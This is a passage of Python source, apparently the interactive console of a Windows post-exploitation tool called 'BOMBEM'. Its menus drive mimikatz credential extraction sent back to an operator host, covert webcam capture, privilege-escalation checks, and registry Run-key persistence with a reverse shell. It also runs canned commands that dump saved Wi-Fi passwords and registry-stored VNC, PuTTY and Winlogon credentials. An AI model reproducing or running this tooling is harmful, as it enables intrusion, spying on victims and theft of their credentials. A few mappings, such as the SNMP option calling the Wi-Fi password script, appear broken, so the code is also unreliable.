                    elif "set output_file " in mimikatz_module:
                        outfile = mimikatz_module[output_file_length:]
                        print("output_file: %s" % outfile)
                    elif "set filename " in mimikatz_module:
                        new_file = mimikatz_module[filename_length:]
                        print("filename: %s" % new_file)
                    elif outfile == "true" or outfile == "True" or outfile == "TRUE" and mimikatz_module == "run":
                        mimikatz_invoke = WindowsExtraction(local_file=new_file)
                        mimikatz_invoke.extractCredentials(your_host=l_host, your_port=l_port, output_file=True,
                                                           save_file=new_file)
                    elif outfile == "false" or outfile == "False" or outfile == "FALSE" and mimikatz_module == "run":
                        mimikatz_invoke = WindowsExtraction(local_file="")
                        mimikatz_invoke.extractCredentials(your_host=l_host, your_port=l_port, output_file=False,
                                                           save_file=new_file)
            elif windows_bombem == "use webcam_capture":
                filename_length = len("set filename ")
                while True:
                    webcam_capture_options = \
                        f"""{Colors.blue}
VARIABLE                                DESCRIPTION{Colors.end}
________                                ___________
filename                                the out file you want to save the image to

(examples)
    set filename image.jpg
    run
"""
                    webcam_capture_module = input("%s(webcam capture module)%s [BOMBEM]:~#" % (Colors.red, Colors.end))
                    if webcam_capture_module == "back" or webcam_capture_module == "exit":
                        break
                    elif webcam_capture_module == "options":
                        print(webcam_capture_options)
                    elif "set filename " in webcam_capture_module:
                        new_file = webcam_capture_module[filename_length:]
                        print("filename: %s" % new_file)
                    elif webcam_capture_module == "run":
                        webcam_capture = WindowsExtraction(local_file=new_file)
                        webcam_capture.WebcamExtraction()
            elif windows_bombem == "use escalate_privileges":
                host_length = len("set your_host ")
                port_length = len("set your_port ")
                while True:
                    escalate_options = \
                        f"""{Colors.blue}
VARIABLES                                    DESCRIPTIONS{Colors.end}
_________                                    ____________
your_host                                    your computer ip address to grab the file off of
your_port                                    the port you will be using to complete the file transfer

(examples)
    set your_host 192.168.0.12
    set your_port 9999
"""
                    escalate_module = input("%s(escalate privileges module)%s [BOMBEM]:~#" % (Colors.red, Colors.end))
                    if escalate_module == "exit" or escalate_module == "back":
                        break
                    elif escalate_module == "options":
                        print(escalate_options)
                    elif "set your_host " in escalate_module:
                        l_host = escalate_module[host_length:]
                        print("your host: %s" % l_host)
                    elif "set your_port " in escalate_module:
                        l_port = escalate_module[port_length:]
                        print("your port %s" % l_port)
                    elif escalate_module == "run":
                        escalate = PostExploitation(r_host=l_host, r_port=l_port)
                        escalate.PrivilegeEscalationChecker(filename="PrivEscChecker.ps1")
            elif windows_bombem == "use registry_persistence":
                reg_length = len("set registry_default ")
                exe_length = len("set executable_name ")
                your_host_length = len("set your_host ")
                your_port_length = len("set your_port ")
                key_length = len("set key ")
                while True:
                    reg_persistence_options = \
                        f"""
VARIABLES                       DESCRIPTION
_________                       ___________
registry_default                set this to true or false depending on if you wanna use the default registry
executable_name                 executable name you want to save the running file under
your_host                       the local host of your machine to connect back to
your_port                       the port you want to use to have the reverse shell on
key                             ONLY select this is 'registry_default' is set to false (this is the registry you want to use)

default registry: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
(examples)
    set registry_default true
    set executable_name HACKED
    set your_host 192.168.0.21
    set your_port 9999
    run
"""
                    reg_persistence_module = input(
                        "%s(registry persistence module)%s [BOMBEM]:~#" % (Colors.red, Colors.end))
                    if reg_persistence_module == "exit" or reg_persistence_module == "back":
                        break
                    elif reg_persistence_module == "options":
                        print(reg_persistence_options)
                    elif "set executable_name " in reg_persistence_module:
                        exe_name = reg_persistence_module[exe_length:]
                        print("executable_name: %s" % exe_name)
                    elif "set your_host " in reg_persistence_module:
                        l_host = reg_persistence_module[your_host_length:]
                        print("your_host: %s" % l_host)
                    elif "set your_port " in reg_persistence_module:
                        l_port = reg_persistence_module[your_port_length:]
                        print("your port: %s" % l_port)
                    elif "set registry_default " in reg_persistence_module:
                        reg_default = reg_persistence_module[reg_length:]
                        print("registry_default: %s" % reg_default)
                    elif "set key " in reg_persistence_module:
                        key = reg_persistence_module[key_length:]
                        print("key: %s" % key)
                    elif reg_default == "true" and reg_persistence_module == "run":
                        reg_persist = PostExploitation(r_port="", r_host="")
                        reg_persist.RegistryPersistence(copy_name=exe_name, local_port=l_port, local_host=l_host,
                                                        add_new=False, registry_key=False)
                        print("[%s*%s] DONE" % (Colors.green, Colors.end))
                    elif reg_default == "false" and reg_persistence_module == "run":
                        reg_persist = PostExploitation(r_port="", r_host="")
                        reg_persist.RegistryPersistence(copy_name=exe_name, local_port=l_port, local_host=l_host,
                                                        add_new=key, registry_key=True)
                        print("[%s*%s] DONE" % (Colors.green, Colors.end))

        def running_scripts():
            try:
                if windows_bombem == "use powershell/list_unqouted_services":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["powershell/list_unqouted_services"], shell=True)
                elif windows_bombem == "use powershell/list_scheduled_tasks":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["powershell/list_scheduled_tasks"], shell=True)
                elif windows_bombem == "use powershell/list_running_processes":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["powershell/list_running_processes"], shell=True)
                elif windows_bombem == "use powershell/list_routing_tables":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["powershell/list_routing_tables"], shell=True)
                elif windows_bombem == "use powershell/list_network_interfaces":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["powershell/list_network_interfaces"],
                                    shell=True)
                elif windows_bombem == "use powershell/list_installed_programs_using_registry":
                    subprocess.call(
                        ScriptsAndMenus.powershell_scripts["powershell/list_installed_programs_using_registry"],
                        shell=True)
                elif windows_bombem == "use powershell/list_installed_programs_using_folders":
                    subprocess.call(
                        ScriptsAndMenus.powershell_scripts["powershell/list_installed_programs_using_folders"],
                        shell=True)
                elif windows_bombem == "use powershell/list_arp_tables":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["powershell/list_arp_tables"], shell=True)
                elif windows_bombem == "use powershell/get_saved_wifi_passwords":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["powershell/get_saved_wifi_passwords"],
                                    shell=True)
                elif windows_bombem == "use powershell/get_iis_config":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["powershell/get_iis_config"], shell=True)
                elif windows_bombem == "use cmd/search_registry_for_passwords_lm":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["cmd/search_registry_for_passwords_lm"],
                                    shell=True)
                elif windows_bombem == "use cmd/search_registry_for_passwords_cu":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["cmd/search_registry_for_passwords_cu"],
                                    shell=True)
                elif windows_bombem == "use cmd/search_for_passwords":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["cmd/search_for_passwords"], shell=True)
                elif windows_bombem == "use cmd/read_registry_winlogon_key":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["cmd/read_registry_winlogon_key"], shell=True)
                elif windows_bombem == "use cmd/read_registry_vnc_passwords":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["cmd/read_registry_vnc_passwords"], shell=True)
                elif windows_bombem == "use cmd/read_registry_snmp_key":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["cmd/read_registry_snmp_key"], shell=True)
                elif windows_bombem == "use cmd/read_registry_runonce_key":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["cmd/read_registry_runonce_key"], shell=True)
                elif windows_bombem == "use cmd/read_registry_run_key":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["cmd/read_registry_r_key"], shell=True)
                elif windows_bombem == "use cmd/read_registry_putty_sessions":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["cmd/read_registry_putty_sessions"], shell=True)
                elif windows_bombem == "use cmd/read_firewall_config":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["cmd/read_firewall_config"], shell=True)
                elif windows_bombem == "use cmd/list_users":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["cmd/list_users"], shell=True)
                elif windows_bombem == "use cmd/list_scheduled_tasks":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["cmd/list_scheduled_tasks"], shell=True)
                elif windows_bombem == "use cmd/list_running_processes":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["cmd/list_running_processes"], shell=True)
                elif windows_bombem == "use cmd/list_processes_running_as_system":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["cmd/list_processes_running_as_system"],
                                    shell=True)
                elif windows_bombem == "use cmd/list_network_shares":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["cmd/list_network_shares"], shell=True)
                elif windows_bombem == "use cmd/list_localgroups":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["cmd/list_localgroups"], shell=True)
                elif windows_bombem == "use cmd/list_drives":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["cmd/list_drives"], shell=True)
                elif windows_bombem == "use cmd/get_snmp_config":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["cmd/get_saved_wifi_passwords"], shell=True)
                elif windows_bombem == "use cmd/get_saved_wifi_aps_ssid":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["cmd/get_saved_wifi_aps_ssid"], shell=True)
                elif windows_bombem == "use cmd/get_architecture":
                    subprocess.call(ScriptsAndMenus.powershell_scripts["cmd/get_architecture"], shell=True)
            except (PermissionError, InterruptedError) as error:
                print(f"Obtained Error: %s" % error)

        def system_commands():
            if windows_bombem == "exit":
                quit(0)
            elif windows_bombem[:2] == "cd":
                try:
                    os.chdir(windows_bombem[3:])
                except (NotADirectoryError, FileNotFoundError) as dir_error:
                    print("[%s-%s] Error: %s" % (Colors.red, Colors.end, dir_error))
            elif "mkdir " in windows_bombem:
                directory_name = windows_bombem[6:]
                os.mkdir(directory_name)
                print("[%s*%s] Process Completed" % (Colors.green, Colors.end))
            elif windows_bombem == "ls" or windows_bombem == "dir":
                os.system("dir")
            elif "rmdir " in windows_bombem:
                os.rmdir(windows_bombem[6:])
                print("[%s*%s] Process Completed" % (Colors.green, Colors.end))
            elif windows_bombem == "privs":
                os.system("whoami /privs")
            elif windows_bombem == "processes":
                os.system("tasklist")

        running_modules()
        running_scripts()
        system_commands()


# run the command line interface
if __name__ == "__main__":
    try:
        interaction()
    except KeyboardInterrupt as interrupt:
        exit(interrupt)
